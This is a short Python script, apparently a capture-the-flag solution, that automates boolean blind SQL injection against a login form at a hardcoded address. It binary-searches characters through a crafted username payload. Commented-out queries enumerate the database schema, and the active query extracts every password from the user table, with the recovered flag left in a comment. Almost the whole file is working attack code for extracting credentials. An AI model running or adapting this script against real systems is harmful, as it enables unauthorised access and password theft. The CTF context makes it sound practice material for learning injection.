```python
#python3
#wh1sper
import requests
host = 'http://59.110.157.4:30052/login.php'
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = ''
    for j in range(50, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = 'database()'#user
            #babyselect = '(select table_name from information_schema.tables where table_schema=database())'#user
            #babyselect = "(select group_concat(column_name) from information_schema.columns " \
            #            "where table_schema=database() and table_name='user')"#id,username,password
            babyselect = "(select group_concat(password) from user)"#0xGame{blind_sqli_1s_not_hard}
            data = {
                "password": "1",
                "username": "1'||ascii(substr({},{},1))>{}#".format(babyselect, j, mid(bot, top))
            }
            r = requests.post(url=host, data=data)
            #print(r.text)
            #print(data)
            if '数据库有你这号人' in r.text:#子查询为真
                if top - 1 == bot:
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)
            else:
                if top - 1 == bot:
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)
if __name__ == '__main__':
    sqli()
```
